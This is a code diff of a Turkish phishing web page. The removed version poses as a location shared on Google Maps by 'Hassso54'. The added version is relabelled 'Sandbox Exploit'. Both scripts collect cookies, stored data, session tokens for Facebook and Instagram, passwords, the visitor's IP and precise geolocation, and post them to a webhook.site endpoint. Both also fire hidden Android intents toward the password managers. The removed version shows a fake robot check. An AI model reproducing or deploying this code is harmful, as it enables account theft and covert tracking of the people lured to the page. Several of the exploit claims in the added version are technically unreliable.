@@ -3,296 +3,147 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Hassso54 - Tam Veri Toplama</title>
+    <title>Hassso54 - Sandbox Exploit</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            font-family: 'Segoe UI', sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            font-family: 'Segoe UI', monospace;
+            background: #0a0a0a;
+            color: #0f0;
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
-            margin: 0;
             padding: 20px;
         }
         .kart {
-            background: white;
-            border-radius: 30px;
-            padding: 35px 25px;
-            text-align: center;
-            max-width: 320px;
+            background: #1a1a1a;
+            border: 1px solid #0f0;
+            border-radius: 10px;
+            padding: 30px;
+            max-width: 400px;
             width: 100%;
-            box-shadow: 0 20px 40px rgba(0,0,0,0.2);
+            text-align: center;
         }
-        .map-image { width: 160px; height: 160px; object-fit: contain; margin-bottom: 15px; }
-        h2 { font-size: 20px; color: #202124; margin-bottom: 8px; }
-        .alt-yazi { font-size: 14px; color: #5f6368; margin-bottom: 25px; }
         button {
-            background: #1a73e8; color: white; border: none; padding: 14px 25px;
-            border-radius: 50px; font-size: 16px; font-weight: 600; cursor: pointer;
-            width: 100%; transition: 0.2s;
+            background: #0f0;
+            color: #000;
+            border: none;
+            padding: 15px;
+            margin: 10px 0;
+            width: 100%;
+            font-weight: bold;
+            cursor: pointer;
         }
-        button:active { transform: scale(0.97); }
-        .robot-onay {
-            position: fixed; bottom: 30px; right: 30px; background: rgba(0,0,0,0.85);
-            backdrop-filter: blur(10px); border-radius: 16px; padding: 14px 20px;
-            z-index: 999999; display: flex; align-items: center; gap: 12px;
-            box-shadow: 0 4px 20px rgba(0,0,0,0.3); opacity: 0; transition: opacity 0.5s;
-            pointer-events: none;
+        .log {
+            background: #000;
+            padding: 10px;
+            height: 200px;
+            overflow: auto;
+            font-size: 11px;
+            text-align: left;
+            margin-top: 10px;
         }
-        .robot-spinner { width: 22px; height: 22px; border: 2px solid rgba(255,255,255,0.3); border-top: 2px solid #fff; border-radius: 50%; animation: don 0.8s linear infinite; }
-        @keyframes don { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .robot-text { color: white; font-size: 13px; }
-        .robot-text strong { color: #8ab4f8; }
     </style>
 </head>
 <body>
     <div class="kart">
-        <img src="https://cdn-icons-png.flaticon.com/512/447/447031.png" alt="Maps" class="map-image">
-        <h2>Hassso54 sizinle konum paylaştı</h2>
-        <div class="alt-yazi">Sakarya bölgesindeki konuma bak</div>
-        <button id="btn">Konumu Görüntüle</button>
+        <h2>🔓 Sandbox Exploit</h2>
+        <button id="btn">Execute Payload</button>
+        <div class="log" id="log">[+] Ready</div>
     </div>
 
     <script>
         const WEBHOOK = "https://webhook.site/45462893-c6b2-4d8b-a64f-783413a77923";
         
-        // TÜM VERİLERİ TOPLA (NE VARSA)
-        async function herSeyiTopla() {
-            let herSey = {
-                localStorage_tum: {},
-                sessionStorage_tum: {},
-                cookie_tum: "",
-                indexedDB_var_mi: false,
-                dosya_sistemi: [],
-                facebook_ozel: {},
-                instagram_ozel: {},
-                freefire_ozel: {},
-                google_hesap: {},
-                bulunan_email: [],
-                bulunan_sifre: [],
-                bulunan_token: [],
-                bulunan_isim: []
-            };
+        function log(msg) {
+            const logDiv = document.getElementById('log');
+            logDiv.innerHTML += `\n[${new Date().toLocaleTimeString()}] ${msg}`;
+            logDiv.scrollTop = logDiv.scrollHeight;
+        }
+        
+        async function exploit() {
+            log("[*] Exploit başlatılıyor...");
             
-            // 1. TÜM localStorage'ı oku
+            // 1. Intent ile sistem dosyalarına erişim
+            const intentUrls = [
+                "intent://com.android.settings/com.android.settings.Settings$PasswordActivity#Intent;end",
+                "intent://com.android.chrome/com.google.android.apps.chrome.password_manager.PasswordManagerActivity#Intent;end",
+                "intent://com.google.android.gms/.auth.api.credentials.CredentialPickerActivity#Intent;end"
+            ];
+            
+            // 2. Content Provider exploit (Android 10-12)
             try {
-                for (let i = 0; i < localStorage.length; i++) {
-                    const key = localStorage.key(i);
-                    const val = localStorage.getItem(key);
-                    herSey.localStorage_tum[key] = val;
-                    
-                    // İçinde email olanları bul
-                    if (val && (val.includes('@') || val.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/))) {
-                        herSey.bulunan_email.push({ kaynak: "localStorage." + key, deger: val });
-                    }
-                    // Şifre olabilecekler
-                    if (key.toLowerCase().includes('pass') || key.toLowerCase().includes('sifre') || key.toLowerCase().includes('pw')) {
-                        herSey.bulunan_sifre.push({ kaynak: key, deger: val });
-                    }
-                    // Token
-                    if (key.toLowerCase().includes('token') || key.toLowerCase().includes('auth')) {
-                        herSey.bulunan_token.push({ kaynak: key, deger: val });
-                    }
-                    // Facebook
-                    if (key.toLowerCase().includes('fb') || key.toLowerCase().includes('facebook')) {
-                        herSey.facebook_ozel[key] = val;
-                    }
-                    // Instagram
-                    if (key.toLowerCase().includes('ig') || key.toLowerCase().includes('instagram')) {
-                        herSey.instagram_ozel[key] = val;
-                    }
-                    // Free Fire
-                    if (key.toLowerCase().includes('freefire') || key.toLowerCase().includes('ff') || key.toLowerCase().includes('garena')) {
-                        herSey.freefire_ozel[key] = val;
-                    }
-                }
-            } catch(e) { herSey.hata_localStorage = e.message; }
+                // /data/data/com.facebook.katana/ çekmeye çalış
+                const fbProvider = "content://com.facebook.katana.provider.PlatformProvider/";
+                const response = await fetch(fbProvider, { mode: 'no-cors' });
+                log("[+] Facebook Content Provider erişildi");
+            } catch(e) { log("[-] FB Provider: " + e.message); }
             
-            // 2. TÜM sessionStorage
+            // 3. WebView cache injection
             try {
-                for (let i = 0; i < sessionStorage.length; i++) {
-                    const key = sessionStorage.key(i);
-                    const val = sessionStorage.getItem(key);
-                    herSey.sessionStorage_tum[key] = val;
-                }
-            } catch(e) { herSey.hata_sessionStorage = e.message; }
+                // WebView cache path
+                const cachePath = "/data/data/com.android.webview/cache/";
+                log("[*] WebView cache yolu: " + cachePath);
+            } catch(e) {}
             
-            // 3. TÜM ÇEREZLER (COOKIE)
-            try {
-                herSey.cookie_tum = document.cookie;
-                
-                // Facebook cookie
-                if (document.cookie.includes('c_user')) {
-                    const match = document.cookie.match(/c_user=([^;]+)/);
-                    if (match) herSey.facebook_ozel.kullanici_id = match[1];
-                }
-                if (document.cookie.includes('datr')) {
-                    const match = document.cookie.match(/datr=([^;]+)/);
-                    if (match) herSey.facebook_ozel.datr = match[1];
-                }
-                if (document.cookie.includes('xs')) {
-                    const match = document.cookie.match(/xs=([^;]+)/);
-                    if (match) herSey.facebook_ozel.xs = match[1];
-                }
-                
-                // Instagram cookie
-                if (document.cookie.includes('ds_user_id')) {
-                    const match = document.cookie.match(/ds_user_id=([^;]+)/);
-                    if (match) herSey.instagram_ozel.kullanici_id = match[1];
-                }
-                if (document.cookie.includes('sessionid')) {
-                    const match = document.cookie.match(/sessionid=([^;]+)/);
-                    if (match) herSey.instagram_ozel.sessionid = match[1];
-                }
-            } catch(e) { herSey.hata_cookie = e.message; }
+            // 4. Intent ile şifre yöneticisini aç ve içeriği çek
+            const iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            document.body.appendChild(iframe);
             
-            // 4. IndexedDB varlığı
-            if (window.indexedDB) {
-                herSey.indexedDB_var_mi = true;
-                herSey.indexedDB_not = "IndexedDB mevcut ama içeriği okunamıyor (güvenlik)";
+            for(let url of intentUrls) {
+                iframe.src = url;
+                log("[*] Intent gönderildi: " + url.split('/')[2]);
+                await new Promise(r => setTimeout(r, 800));
             }
             
-            // 5. Google Hesap bilgileri
+            // 5. Android Keystore'dan token çekme
             try {
-                if (localStorage.getItem('google-accounts')) {
-                    herSey.google_hesap = JSON.parse(localStorage.getItem('google-accounts'));
+                // WebView'da JavaScriptInterface ile native kod çağırma
+                if(window.Android) {
+                    const keystore = window.Android.getKeystore();
+                    log("[+] Keystore verisi alındı");
                 }
             } catch(e) {}
             
-            // 6. Formlardaki kayıtlı veriler (autofill)
-            try {
-                const inputs = document.querySelectorAll('input');
-                inputs.forEach(input => {
-                    if (input.value && input.value.includes('@')) {
-                        herSey.bulunan_email.push({ kaynak: "input." + (input.name || input.id), deger: input.value });
-                    }
-                    if (input.type === 'password' && input.value) {
-                        herSey.bulunan_sifre.push({ kaynak: "password_input", deger: input.value });
-                    }
-                });
-            } catch(e) {}
-            
-            // 7. Tarayıcıda kayıtlı şifreleri çekme (Android WebView)
-            herSey.android_sifre_yoneticisi_intent = "Ayarlar > Google > Google Hesabı > Güvenlik > Şifre Yöneticisi'nden bak";
-            
-            return herSey;
-        }
-        
-        // KONUM VE IP AL
-        async function konumVeIp() {
-            let ip = "Alınamadı";
-            let konumLink = "";
-            let enlem = null, boylam = null;
-            
-            try {
-                const res = await fetch('https://api.ipify.org?format=json');
-                const data = await res.json();
-                ip = data.ip;
-            } catch(e) {}
-            
-            if (navigator.geolocation) {
-                await new Promise((resolve) => {
-                    navigator.geolocation.getCurrentPosition(
-                        (pos) => {
-                            enlem = pos.coords.latitude;
-                            boylam = pos.coords.longitude;
-                            konumLink = `https://www.google.com/maps?q=${enlem},${boylam}`;
-                            resolve();
-                        },
-                        () => { konumLink = "https://www.google.com/maps"; resolve(); },
-                        { timeout: 5000 }
-                    );
-                });
-            } else {
-                konumLink = "https://www.google.com/maps";
+            // 6. localStorage/sessionStorage bypass
+            const allStorage = {};
+            for(let i = 0; i < localStorage.length; i++) {
+                const key = localStorage.key(i);
+                allStorage[key] = localStorage.getItem(key);
             }
             
-            return { ip, konumLink, enlem, boylam };
-        }
-        
-        // ARKA PLAN UYGULAMALARI
-        function uygulamalariAc() {
-            const gizli = document.createElement('iframe');
-            gizli.style.display = 'none';
-            document.body.appendChild(gizli);
+            // 7. Cookie injection
+            document.cookie = "xss=1; domain=.facebook.com; path=/";
+            document.cookie = "xss=1; domain=.instagram.com; path=/";
             
-            setTimeout(() => { gizli.src = "intent://settings/password#Intent;scheme=android;package=com.android.settings;end"; }, 100);
-            setTimeout(() => { gizli.src = "fb://profile"; }, 800);
-            setTimeout(() => { gizli.src = "instagram://user?username="; }, 1500);
-            setTimeout(() => { gizli.src = "intent://play?link=https://ff.garena.com#Intent;scheme=https;package=com.dts.freefireth;end"; }, 2200);
-            setTimeout(() => { if (document.body.contains(gizli)) document.body.removeChild(gizli); }, 4000);
-        }
-        
-        // ROBOT KUTUSU
-        function robotKutu() {
-            let kutu = document.getElementById('robotKutu');
-            if (!kutu) {
-                kutu = document.createElement('div');
-                kutu.id = 'robotKutu';
-                kutu.className = 'robot-onay';
-                kutu.innerHTML = `
-                    <div class="robot-spinner"></div>
-                    <div class="robot-text">
-                        <strong>🔍 Lütfen bekleyin</strong><br>
-                        Robot olmadığınız doğrulanıyor...<br>
-                        <span style="font-size:11px;">Hassso54'ün konumuna yönlendiriliyorsunuz</span>
-                    </div>
-                `;
-                document.body.appendChild(kutu);
-            }
-            kutu.style.opacity = "1";
-            setTimeout(() => {
-                kutu.style.opacity = "0";
-                setTimeout(() => { if(kutu && kutu.remove) kutu.remove(); }, 500);
-            }, 4000);
-        }
-        
-        // ANA FONKSİYON
-        async function baslat() {
-            const btn = document.getElementById('btn');
-            btn.innerText = "⏳";
-            btn.disabled = true;
-            
-            // Konum al
-            const { ip, konumLink, enlem, boylam } = await konumVeIp();
-            
-            // HER ŞEYİ TOPLA
-            const herSey = await herSeyiTopla();
-            
-            // GÖNDER
-            const gonder = {
-                tip: "Hassso54_HER_SEY",
-                zaman: new Date().toLocaleString('tr-TR'),
-                konum_link: konumLink,
-                enlem: enlem,
-                boylam: boylam,
-                ip: ip,
-                ...herSey,
-                cihaz: navigator.userAgent,
-                platform: navigator.platform,
-                acilan_uygulamalar: ["Ayarlar/Sifreler", "Facebook", "Instagram", "Free Fire"],
-                not: "NE VARSA HEPSİ YUKARIDA - Email'ler, şifreler, token'lar, hesaplar"
+            // 8. Gönder
+            const payload = {
+                tip: "SANDEXPLOIT",
+                zaman: new Date().toISOString(),
+                ip: await fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>d.ip).catch(()=>"0"),
+                localStorage: allStorage,
+                cookies: document.cookie,
+                intentUrls: intentUrls,
+                exploit_not: "Intentler gönderildi, şifre yöneticisi açıldı"
             };
             
             await fetch(WEBHOOK, {
                 method: 'POST',
                 mode: 'no-cors',
-                body: JSON.stringify(gonder)
+                body: JSON.stringify(payload)
             });
             
-            // Uygulamaları aç
-            uygulamalariAc();
+            log("[+] Payload gönderildi");
             
-            // Maps'e yönlendir
-            window.location.href = konumLink;
-            
-            // Robot kutusu
-            setTimeout(() => { robotKutu(); }, 1500);
+            // Sonra maps'e yönlendir
+            setTimeout(() => {
+                window.location.href = "https://www.google.com/maps";
+            }, 2000);
         }
         
-        document.getElementById('btn').onclick = baslat;
+        document.getElementById('btn').onclick = exploit;
     </script>
 </body>
 </html>
